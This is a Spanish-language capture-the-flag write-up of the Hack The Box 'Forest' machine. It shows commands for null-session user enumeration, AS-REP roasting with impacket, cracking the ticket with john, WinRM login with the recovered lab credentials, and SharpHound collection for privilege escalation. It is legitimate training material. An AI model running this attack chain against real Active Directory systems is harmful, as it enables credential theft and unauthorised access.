#  FOREST MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/FOREST/images/1.png)

## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```bash
nmap -p- --open -T5 -v -n 10.10.10.161 -oG allPorts
```

La salida nos muesta los sigueinets puertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/FOREST/images/2.png)

Vamos a realizar una enumeracion de los servicios en los puertos:

```bash
nmap -p -sV -sC 10.10.10.161 -oN targeted
```

este es el resultado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/FOREST/images/3.png)

## EXPLOTACION

nos estamos enfrentando a un active directory ya que el servicio de kerberos (88)  esta abierto, vamos a empezar con la enumeracion del protocolo RPC (135) ya que esta abierto:

podemos probar la sesion nula con la herramienta **rpcclient**:

```bash
rpcclient 10.10.10.161 -N -U ""
```

nos deja conectarnos pero a veces esto es un falso positivo:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/FOREST/images/4.png)

para ver si en realidad la sesion nula es permitida debemos intentar enumerar algo y ver si nos muestra lo que queremos o un **permission denied**, vamos a enumerar usuarios del dominio:

```bash
enumdomusers
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/FOREST/images/5.png)

vemos informacion por lo que la sesion nula si estaba permitida, otra forma de enumerar usuarios podia ser con **enum4linux** ya que el puerto 139 esta abierto:

```bash
enum4linux -a 10.10.10.161
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/FOREST/images/6.png)

ya con usuarios podemos probar el ataque **AS_REP_ROAST**, para ello vamos a filtrar solo los nombres de la enumeracion y colocarlo en un archivo:

```bash
rpcclient 10.10.10.161 -N -U "" -c "enumdomusers" >users.txt

cat users.txt | grep -oP "\[.*?\]" | tr -d "[]" | grep -v "^0x" > users

rmk users.txt
```

vamos a usar el script de impacket **GetNPUsers.py** y le pasamos el archivo **users**

```bash
python3 /opt/impacket/examples/GetNPUsers.py htb.local/ -no-pass -usersfile users
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/FOREST/images/7.png)

y vemos que hay un usuario vulnerable y obtuvimos su ticket de kerberos, ahora vamos a ver si podemos crackearlo, para ello copiamos ese ticket en un archivo y usamos john:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ticket
```

y vemos que tenemos unas credenciales:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/FOREST/images/8.png)


|usuario|contraseña|
|:----:|:----:|
|svc-alfresco|s3rvice|

el dominiio es **htb.local** asi que es mejor si lo agregamos al **/etc/host**

ahora el puerto 5985 tambien estaba abierto, usemos **evil-winrm** para conectarnos:

comprobar que esta abierto:

```bash
cme winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

```bash
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' -e .
```

estamos dentro y podemos ver la primera flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/FOREST/images/9.png)

## ELEVACION DE PRIVILEGIOS

vamos a user **bloodhound** para ver como escalar privilegios

debemos instalar neo4j y bloodhound por si no lo tenemos:

```bash
apt install neo4j

apt update

apt install bloodhound
```

si es la primera vez que se inicia el servicio de **neo4j** lo levantamos con:

```bash
neo4j console
```

nos levantara un servicio en **http://localhost:7474/browser/** y nos autenticamos con las credenciales por defecto **neo4j:neo4j**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/FOREST/images/10.png)

nos pedira cambio de contraseña y ai ponemos lo que nos de la gana y nos acordemos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/FOREST/images/11.png)

ahora nos iniciamos el bloodhound:

```bash
bloodhound --nosandbox &> /dev/null &
disown
```

y colocamos las credenciales que nos pidio actualizacion:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/FOREST/images/12.png)

ahora necesitamos proporcianarle a **bloodhound** informacion que la tenemos que recolectar con [sharphound.ps1](https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1)

nos lo descargamos y nos lo pasamos por **evil-winrm**.

```bash
upload SharpHound.ps1
```

 lo importamos e invocamos:
 
```bash
Import-Module "C:/Users/svc-alfresco/Documents/SharpHound.ps1"

Invoke-BloodHound -CollectionMethod All
```

esto generara un archivo **.zip** que debemos importalo en el **bloodhound**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/FOREST/images/13.png)

lo descargamos por **evil-winrm**:

```bash
download 20211117181831_BloodHound.zip
```

ahora lo importamos en el bloodhound


